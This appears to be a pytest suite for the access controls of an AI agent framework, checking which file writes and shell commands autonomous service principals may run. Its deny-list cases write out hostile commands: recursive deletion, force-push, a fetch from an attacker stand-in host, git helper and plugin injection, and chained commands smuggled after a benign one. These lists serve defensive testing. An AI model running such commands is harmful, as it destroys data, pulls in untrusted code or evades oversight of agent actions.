        Path("memory/issues/relative.md"),
    ):
        decision = registry.authorize_tool(
            "write_file", auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is True, target


def test_autonomous_write_uses_trigger_state_and_explicit_repo_rw_roots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    trigger_state = home / "state" / "triggers" / "poller"
    repo = tmp_path / "repo"
    readonly = tmp_path / "readonly"
    outside = tmp_path / "outside"
    trigger_state.mkdir(parents=True)
    repo.mkdir()
    readonly.mkdir()
    outside.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw,{readonly}:ro")
    service = build_trigger_service_principal(
        canonical="poller:writer",
        trigger="poller",
        profile="custom",
        tier=CapabilityTier.SCOPE_CONTAINED,
        capabilities=("write_file", "edit_file"),
        roots=(trigger_state,),
        creation_path="test",
    )
    auth = _service_auth(service, InformationFlowLabels())
    registry = ToolRegistry()

    for target in (
        repo / "source.py",
        trigger_state / "cursor.json",
        home / "state" / "reports" / "audit.md",
        home / "memory" / "issues" / "982.md",
    ):
        assert registry.authorize_tool(
            "write_file", auth, enforce=True, target_channel=str(target),
        ).allowed is True
    for target in (
        home,
        home / "root.txt",
        readonly / "data.txt",
        outside / "data.txt",
        Path("/tmp/unscoped.txt"),
    ):
        decision = registry.authorize_tool(
            "write_file", auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "service_sink_destination_denied"
    assert registry.authorize_tool(
        "write_file", auth, enforce=True, target_channel="cursor.json",
    ).allowed is False


@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_autonomous_repo_write_denies_protected_paths(
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    state = home / "state" / "pollers" / "github-activity"
    memory = home / "memory"
    repo = tmp_path / "repo"
    state.mkdir(parents=True)
    memory.mkdir()
    repo.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw")
    service = build_trigger_service_principal(
        canonical="poller:github-activity",
        trigger="poller",
        profile="github",
        tier=CapabilityTier.CODE_EXECUTION,
        capabilities=(tool_name,),
        roots=(state,),
        creation_path="test",
    )
    auth = _service_auth(service, InformationFlowLabels())
    registry = ToolRegistry()

    for target in (
        repo / ".env",
        repo / "config.yaml",
        repo / "credentials.json",
        repo / "identities.yaml",
        repo / "secrets" / "token.txt",
        repo / "prompts" / "system.md",
        repo / "memory" / "core" / "identity.md",
        state / ".env.local",
        home / "state" / "config" / "settings.toml",
        home / "state" / "credentials.json",
        home / "state" / "identities.yaml",
        home / "state" / "prompts" / "system.md",
        home / "state" / ".mimir" / "pending-update.flag",
        home / "state" / "oauth_github.json",
        home / "state" / "service.key",
        home / "state" / "service.pem",
        memory / "core" / "identity.md",
        memory / ".env",
        memory / "secrets" / "token.txt",
    ):
        decision = registry.authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_dynamic_trigger_write_denies_symlinked_protected_paths(
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    state = home / "state"
    memory = home / "memory"
    trigger_root = state / "pollers" / "github-activity"
    repo = tmp_path / "repo"
    trigger_root.mkdir(parents=True)
    memory.mkdir()
    (repo / "safe").mkdir(parents=True)
    (repo / "prompts").mkdir()
    (state / "credentials").symlink_to(repo / "safe", target_is_directory=True)
    (state / "alias").symlink_to(repo / "prompts", target_is_directory=True)
    (memory / "core").symlink_to(repo / "safe", target_is_directory=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw")
    service = build_trigger_service_principal(
        canonical="poller:github-activity",
        trigger="poller",
        profile="github",
        tier=CapabilityTier.CODE_EXECUTION,
        capabilities=(tool_name,),
        roots=(trigger_root,),
        creation_path="test",
    )
    auth = _service_auth(service, InformationFlowLabels())

    for target in (
        state / "credentials" / "token.txt",
        state / "alias" / "system.md",
        memory / "core" / "identity.md",
    ):
        decision = ToolRegistry().authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize(
    "command",
    [
        "gh pr view 979 --json number,title,headRefOid",
        "gh pr diff 979 --patch",
        "gh pr checks 979 --required",
        "git status --short",
        "git log --oneline --max-count=10",
        "git diff --stat HEAD~1",
        "git fetch origin pull/979/head",
        "git checkout review-979",
        "npm ci --ignore-scripts --no-audit --no-fund",
        "npm test -- --run",
        "npm run test",
        "pytest -q -x -k shell_profile --tb=short --maxfail=1 tests/test_access_control.py",
        "uv run pytest tests/test_access_control.py -q -m 'not slow' --tb short",
    ],
)
def test_repo_review_shell_profile_admits_review_commands(command: str) -> None:
    service = build_trigger_service_principal(
        canonical="poller:github-activity",
        trigger="poller",
        profile="github",
        tier=CapabilityTier.CODE_EXECUTION,
        capabilities=("shell_exec", "bash_jobs_list", "bash_job_output"),
        creation_path="test",
    )
    decision = ToolRegistry().authorize_tool(
        "shell_exec", _service_auth(service, InformationFlowLabels()),
        enforce=True, target_channel=command,
    )

    assert service.sink_policy_for("shell_exec") == ServiceSinkPolicy(
        "shell_exec", "shell_profile", "repo_review",
    )
    assert decision.allowed is True, decision.reason


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf .",
        "git push --force origin HEAD",
        "git reset --hard HEAD~1",
        "git rebase -i HEAD~2",
        "git config credential.helper store",
        "git fetch ext::sh origin",
        "git fetch https://attacker.example/repo.git",
        "gh auth login",
        "npm ci --no-audit --no-fund",
        "npm ci -- --ignore-scripts",
        "npm ci --ignore-scripts=false",
        "npm ci --no-ignore-scripts",
        "npm ci --ignore-scripts false",
        "npm ci --ignore-scripts --ignore-scripts",
        "npm install left-pad",
        "npm update",
        "pytest -p malicious_plugin tests",
        "pytest -c /tmp/attacker.ini tests",
        "pytest -o addopts=-pattacker tests",
        "pytest --rootdir /tmp tests",
        "pytest --pdb tests",
        "pytest /tmp/attacker/tests",
        "pytest ../attacker/tests",
        "pytest -- /tmp/attacker/tests",
        "pytest @args.txt",
        "pytest @../attacker-args.txt",
        "pytest @/tmp/attacker-args.txt",
        "uv run pytest -p malicious_plugin tests",
        "uv run pytest -c /tmp/attacker.ini tests",
        "uv run pytest -o addopts=-pattacker tests",
        "uv run pytest --rootdir /tmp tests",
        "uv run pytest --pdb tests",
        "uv run pytest /tmp/attacker/tests",
        "uv run pytest ../attacker/tests",
        "uv run pytest -- /tmp/attacker/tests",
        "uv run pytest @args.txt",
        "uv run pytest @../attacker-args.txt",
        "uv run pytest @/tmp/attacker-args.txt",
        "uv sync",
        "python -m pytest",
        "sh -c 'git status'",
        "env uv run pytest",
    ],
)
def test_repo_review_shell_profile_denies_destructive_or_unbounded_commands(
    command: str,
) -> None:
    service = build_trigger_service_principal(
        canonical="poller:github-activity",
        trigger="poller",
        profile="github",
        tier=CapabilityTier.CODE_EXECUTION,
        capabilities=("shell_exec", "bash_jobs_list", "bash_job_output"),
        creation_path="test",
    )
    decision = ToolRegistry().authorize_tool(
        "shell_exec", _service_auth(service, InformationFlowLabels()),
        enforce=True, target_channel=command,
    )

    assert decision.allowed is False
    assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize(
    ("command", "command_key"),
    [
        ("git status --porcelain", "git"),
        ("git diff --stat HEAD~1", "git"),
        ("git show --name-only 5444bb55", "git"),
        ("git log --oneline -5", "git"),
        ("git branch --show-current", "git"),
        # Maintenance turns use these read-only GitHub and Chainlink lookups.
        ("gh pr list --state open --limit 20", "gh"),
        ("gh pr view 979 --json title,state,reviews", "gh"),
        ("gh issue list --state open --label security", "gh"),
        ("gh issue view 922 --comments", "gh"),
        ("ls -la", "ls"),
        ("grep -n needle sample.txt", "grep"),
        ("wc -l sample.txt", "wc"),
        ("pwd -P", "pwd"),
        ("jq -r .name sample.json", "jq"),
        ("rg --no-config -n needle .", "rg"),
        (
            "/usr/local/bin/chainlink issue list --status all "
            "--label worklink:ready --json",
            "/usr/local/bin/chainlink",
        ),
        ("/usr/local/bin/chainlink issue ready --json", "/usr/local/bin/chainlink"),
        ("/usr/local/bin/chainlink issue show 922 --json", "/usr/local/bin/chainlink"),
        (
            "/usr/local/bin/chainlink issue list --status open",
            "/usr/local/bin/chainlink",
        ),
    ],
)
def test_maintenance_shell_profile_admits_prompt_inspection_commands(
    command: str,
    command_key: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import mimir.access_control as access_control

    home = tmp_path / "home"
    home.mkdir()
    subprocess.run(["git", "init", "-q", str(home)], check=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    executable = tmp_path / command_key.rsplit("/", 1)[-1]
    executable.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    executable.chmod(0o755)
    monkeypatch.setitem(
        access_control._MAINTENANCE_PINNED_EXECUTABLES, command_key, executable,
    )
    if command_key == "git":
        command = command.replace("git ", f"git -C {home} ", 1)
    service = get_service_principal("scheduled_tick")
    assert service is not None

    decision = ToolRegistry().authorize_tool(
        "shell_exec", _service_auth(service, InformationFlowLabels()),
        enforce=True, target_channel=command,
    )

    assert service.sink_policy_for("shell_exec") == ServiceSinkPolicy(
        "shell_exec", "shell_profile", "maintenance",
    )
    assert service.sink_policy_for("bash_async") == ServiceSinkPolicy(
        "bash_async", "shell_profile", "maintenance",
    )
    assert decision.allowed is True, decision.reason


@pytest.mark.parametrize(
    ("command", "command_key"),
    [
        ("gh pr list --state open", "gh"),
        ("ls -la", "ls"),
        ("grep -n needle sample.txt", "grep"),
        ("wc -l sample.txt", "wc"),
        ("pwd -P", "pwd"),
        ("jq -r .name sample.json", "jq"),
        ("rg --no-config -n needle .", "rg"),
        (
            "/usr/local/bin/chainlink issue ready --json",
            "/usr/local/bin/chainlink",
        ),
    ],
)
def test_maintenance_shell_returns_pinned_execution_argv(
    command: str,
    command_key: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import mimir.access_control as access_control

    executable = tmp_path / command_key.rsplit("/", 1)[-1]
    executable.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    executable.chmod(0o755)
    monkeypatch.setitem(
        access_control._MAINTENANCE_PINNED_EXECUTABLES,
        command_key,
        executable,
    )

    argv = parse_service_shell_argv(command, "maintenance")

    assert argv is not None
    assert argv[0] == str(executable)
    assert Path(argv[0]).is_absolute()


@pytest.mark.parametrize("failure", ["missing", "symlink", "non_executable"])
def test_maintenance_shell_fails_loudly_when_pinned_executable_is_invalid(
    failure: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    import mimir.access_control as access_control

    expected = tmp_path / "gh"
    if failure == "missing":
        expected = Path("/definitely-missing/gh")
    elif failure == "symlink":
        target = tmp_path / "real-gh"
        target.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        target.chmod(0o755)
        expected.symlink_to(target)
    else:
        expected.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")

    monkeypatch.setitem(access_control._MAINTENANCE_PINNED_EXECUTABLES, "gh", expected)

    with caplog.at_level("ERROR", logger="mimir.access_control"):
        assert parse_service_shell_argv("gh pr list --state open", "maintenance") is None

    assert "maintenance_pinned_executable_missing" in caplog.text
    assert str(expected) in caplog.text


def test_maintenance_git_denies_bare_commands(
    maintenance_git_home: Path,
) -> None:
    for command in (
        "git status --short",
        "git log --oneline -5",
        "git diff --stat HEAD~1",
    ):
        assert parse_service_shell_argv(command, "maintenance") is None


@pytest.mark.parametrize(
    ("command", "subcommand", "arguments"),
    [
        ("git status --short", "status", ["--short"]),
        ("git log --oneline -5", "log", ["--oneline", "-5"]),
        ("git diff --stat HEAD~1", "diff", ["--stat", "HEAD~1"]),
        ("git log -p", "log", ["-p"]),
        ("git show --name-only 5444bb55", "show", ["--name-only", "5444bb55"]),
        ("git branch --show-current", "branch", ["--show-current"]),
    ],
)
def test_maintenance_git_returns_hardened_execution_argv(
    command: str,
    subcommand: str,
    arguments: list[str],
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import mimir.access_control as access_control

    home = tmp_path / "home"
    home.mkdir()
    subprocess.run(["git", "init", "-q", str(home)], check=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.delenv("MIMIR_FILE_TOOL_ROOTS", raising=False)
    pinned_git = tmp_path / "git"
    pinned_git.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    pinned_git.chmod(0o755)
    monkeypatch.setitem(
        access_control._MAINTENANCE_PINNED_EXECUTABLES, "git", pinned_git,
    )

    command = command.replace("git ", f"git -C {home} ", 1)
    assert parse_service_shell_argv(command, "maintenance") == [
        str(pinned_git), "-C", str(home.resolve()),
        "-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null",
        "-c", "diff.external=", "-c", "protocol.allow=never",
        "--no-pager", "--no-optional-locks", subcommand, *arguments,
        *(
            ["--no-ext-diff", "--no-textconv"]
            if subcommand in {"diff", "log", "show"}
            else []
        ),
    ]


def test_maintenance_git_resolves_c_within_configured_roots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    nested = repo / "nested"
    home.mkdir()
    nested.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", str(home)], check=True)
    subprocess.run(["git", "init", "-q", str(nested)], check=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")

    assert parse_service_shell_argv(
        f"git -C {nested} log --oneline -5", "maintenance",
    ) == [
        "/usr/bin/git", "-C", str(nested.resolve()),
        "-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null",
        "-c", "diff.external=", "-c", "protocol.allow=never",
        "--no-pager", "--no-optional-locks",
        "log", "--oneline", "-5", "--no-ext-diff", "--no-textconv",
    ]
    state = home / "state"
    state.mkdir()
    assert parse_service_shell_argv(
        "git -C state status --short", "maintenance",
    ) == [
        "/usr/bin/git", "-C", str(state.resolve()),
        "-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null",
        "-c", "diff.external=", "-c", "protocol.allow=never",
        "--no-pager", "--no-optional-locks", "status", "--short",
    ]


def test_maintenance_git_execution_argv_suppresses_configured_helpers(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    source = repo / "sample.txt"
    source.write_text("before\n", encoding="utf-8")
    subprocess.run(["git", "-C", str(repo), "add", "sample.txt"], check=True)
    subprocess.run(
        [
            "git", "-C", str(repo),
            "-c", "user.name=test", "-c", "user.email=test@example.com",
            "commit", "-qm", "initial",
        ],
        check=True,
    )
    source.write_text("after\n", encoding="utf-8")

    marker = tmp_path / "helper-fired"
    helper = tmp_path / "helper.sh"
    helper.write_text(
        f"#!/bin/sh\necho fired >> {marker}\nexit 0\n",
        encoding="utf-8",
    )
    helper.chmod(0o755)
    subprocess.run(
        ["git", "-C", str(repo), "config", "core.fsmonitor", str(helper)],
        check=True,
    )
    subprocess.run(
        ["git", "-C", str(repo), "config", "diff.external", str(helper)],
        check=True,
    )
    monkeypatch.setenv("MIMIR_HOME", str(repo))
    monkeypatch.delenv("MIMIR_FILE_TOOL_ROOTS", raising=False)

    subprocess.run(
        ["git", "-C", str(repo), "config", "diff.owned.textconv", str(helper)],
        check=True,
    )
    subprocess.run(
        ["git", "-C", str(repo), "config", "filter.owned.clean", str(helper)],
        check=True,
    )
    (repo / ".gitattributes").write_text(
        "sample.txt diff=owned filter=owned\n",
        encoding="utf-8",
    )

    for command in ("git status --short", "git diff", "git log -p -1"):
        command = command.replace("git ", f"git -C {repo} ", 1)
        argv = parse_service_shell_argv(command, "maintenance")
        assert argv is not None
        filter_index = argv.index("filter.owned.clean=")
        assert argv[filter_index - 1:filter_index + 1] == [
            "-c", "filter.owned.clean=",
        ]
        subprocess.run(
            argv,
            check=True,
            cwd=tmp_path,
            env={**os.environ, "GIT_PAGER": "cat"},
            capture_output=True,
            text=True,
        )

    assert marker.exists() is False


@pytest.mark.parametrize(
    "command",
    [
        "git -C /etc status --short",
        "git -C ../outside status --short",
        "git -C /tmp status --short",
        "git -C --config status --short",
        "git -c core.fsmonitor= status --short",
        "git --config-env=core.fsmonitor=MALICIOUS status --short",
    ],
)
def test_maintenance_git_denies_unconfigured_roots_and_model_git_globals(
    command: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.delenv("MIMIR_FILE_TOOL_ROOTS", raising=False)

    assert parse_service_shell_argv(command, "maintenance") is None


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf .",
        "git push --force origin HEAD",
        "git reset --hard HEAD~1",
        "git rebase -i HEAD~2",
        "git config credential.helper store",
        "git status --no-ext-diff",
        "git status --verbose",
        "git status -v",
        "git log --no-textconv --oneline",
        "git branch --list",
        "git diff -- sample.txt",
        "git log -- --all",
        "git show -- --format=raw",
        "gh auth login",
        "gh pr create --title mutation",
        "gh issue comment 922 --body mutation",
        "chainlink issue list --status open",
        "chainlink issue create mutation",
        "chainlink issue comment 922 mutation",
        "/tmp/chainlink issue list --status open",
        "npm ci",
        "npm install left-pad",
        "pip install requests",
        "uv add requests",
        "python -c 'print(1)'",
        "python -m pytest",
        "pytest -q",
        "spawn_open_code task",
        "sh -c 'git status'",
    ],
)
def test_maintenance_shell_profile_denies_mutating_or_unbounded_commands(
    command: str,
) -> None:
    service = get_service_principal("scheduled_tick")
    assert service is not None

    decision = ToolRegistry().authorize_tool(
        "shell_exec", _service_auth(service, InformationFlowLabels()),
        enforce=True, target_channel=command,
    )

    assert decision.allowed is False
    assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize(
    "command",
    [
        "git status; rm -rf .",
        "git status\nrm -rf .",
        "git status ~/repo",
        "gh pr view 'unterminated",
    ],
)
def test_maintenance_shell_profile_preserves_shared_argv_guards(command: str) -> None:
    import mimir.access_control as access_control

    assert access_control.parse_service_shell_argv(command, "maintenance") is None


def test_non_repo_poller_keeps_scheduler_read_only_shell_profile() -> None:
    service = build_trigger_service_principal(
        canonical="poller:feed",
        trigger="poller",
        profile="custom",
        tier=CapabilityTier.SCOPE_CONTAINED,
        capabilities=("shell_exec", "bash_jobs_list", "bash_job_output"),
        creation_path="test",
    )
    registry = ToolRegistry()
    auth = _service_auth(service, InformationFlowLabels())

    assert service.sink_policy_for("shell_exec") == ServiceSinkPolicy(
        "shell_exec", "shell_profile", "scheduler_read_only",
    )
    assert registry.authorize_tool(
        "shell_exec", auth, enforce=True, target_channel="git status --short",
    ).allowed is True
    assert registry.authorize_tool(
        "shell_exec", auth, enforce=True, target_channel="git fetch origin",
    ).allowed is False


def test_autonomous_worklink_requires_trusted_turn_and_spawn_stays_blocked(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    monkeypatch.setenv("WORKLINK_REPO", str(repo))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", str(repo))
    service = ServicePrincipal(
        canonical="poller:factory",
        trigger="poller",
        capabilities=("worklink_run", "spawn_open_code"),
        readable_domains=("poller_payload",),
        sink_destinations=("worklink", "spawn_process"),
        sink_policies=(
            ServiceSinkPolicy(
                "worklink_run", "worklink_repo", "WORKLINK_REPO/MIMIR_WORKLINK_REPO",
            ),
            ServiceSinkPolicy(
                "spawn_open_code", "spawn_workspace", "MIMIR_HOME/MIMIR_FILE_TOOL_ROOTS",
            ),
        ),
        capability_tier=CapabilityTier.CODE_EXECUTION,
    )
    trusted_source = SourceLabel(
        principal="service:poller:factory",
        domain="channel",
        resource_id="poller:test",
        bridge_instance="poller",
        sensitivity="internal",
        authorized_principals=frozenset({"service:poller:factory"}),
        source_kind="service",
        integrity="trusted",
        integrity_effect="active_ingest",
    )
    untrusted_source = replace(trusted_source, integrity="untrusted")
    trusted = InformationFlowLabels().with_channel("poller:test").with_source(trusted_source)
    untrusted = InformationFlowLabels().with_channel("poller:test").with_source(untrusted_source)
    registry = ToolRegistry()

    admitted = registry.authorize_tool(
        "worklink_run", _service_auth(service, trusted), enforce=True,
        target_channel=str(repo),
    )
    tainted = registry.authorize_tool(
        "worklink_run", _service_auth(service, untrusted), enforce=True,
        target_channel=str(repo),
    )
    spawn = registry.authorize_tool(
        "spawn_open_code", _service_auth(service, trusted), enforce=True,
        target_channel=str(repo),
    )

    assert admitted.allowed is True
    assert tainted.allowed is False
    assert tainted.reason == "ifc_label_blocked:spawn"
    assert spawn.allowed is False
    assert spawn.reason == "ifc_label_blocked:spawn"


def test_admin_write_and_code_tool_authority_is_unchanged(tmp_path: Path) -> None:
    registry = ToolRegistry()
    for operation in ("write_file", "edit_file", "worklink_run", "spawn_open_code"):
        assert registry.authorize_tool(
            operation,
            _write_auth(admin=True),
            enforce=True,
            target_channel=str(tmp_path / "outside"),
        ).allowed is True
